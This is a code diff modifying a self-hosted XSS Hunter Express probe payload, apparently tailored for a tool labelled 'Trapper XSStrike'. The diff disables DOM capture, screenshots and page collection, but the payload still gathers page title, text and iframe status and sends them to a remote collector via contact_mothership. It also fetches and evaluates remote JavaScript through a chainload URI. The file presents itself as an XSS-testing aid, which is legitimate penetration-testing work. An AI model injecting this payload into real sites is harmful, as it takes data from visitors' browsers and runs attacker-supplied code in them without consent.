@@ -23,6 +23,8 @@ This is a payload to test for Cross-site Scripting (XSS). It is meant to be used
 This is a self-hosted instance of XSS Hunter Express. It is not the same as the XSS Hunter website.
 */
 
+console.log('Trapper XSStrike Stored XSS Payload loaded.');
+
 // FormData polyfill https://github.com/jimmywarting/FormData
 if (
   'undefined' != typeof Blob &&
@@ -2918,30 +2920,32 @@ try {
 
 probe_return_data['title'] = document.title;
 
-probe_return_data['text'] = get_dom_text();
+probe_return_data['text'] = get_dom_text(); // TRAPPER: disable this
 
 probe_return_data['was_iframe'] = !(window.top === window);
 
 function hook_load_if_not_ready() {
-  try {
-    try {
-      probe_return_data['dom'] = never_null(document.documentElement.outerHTML);
-    } catch (e) {
-      probe_return_data['dom'] = '';
-    }
-    html2canvas(document.body).then(function (canvas) {
-      probe_return_data['screenshot'] = canvas.toDataURL();
-      finishing_moves();
-    });
-  } catch (e) {
-    probe_return_data['screenshot'] = '';
-    finishing_moves();
-  }
+  // try {
+  //   try {
+  //     probe_return_data['dom'] = never_null(document.documentElement.outerHTML);
+  //   } catch (e) {
+  //     probe_return_data['dom'] = '';
+  //   }
+  //   html2canvas(document.body).then(function (canvas) {
+  //     probe_return_data['screenshot'] = canvas.toDataURL();
+  //     finishing_moves();
+  //   });
+  // } catch (e) {
+  //   probe_return_data['screenshot'] = '';
+  //   finishing_moves();
+  // }
+
+  finishing_moves();
 }
 
 function finishing_moves() {
   contact_mothership(probe_return_data);
-  collect_pages();
+  // collect_pages(); // dont collect pages
   if (chainload_uri != '' && chainload_uri != null) {
     eval_remote_source(chainload_uri);
   }
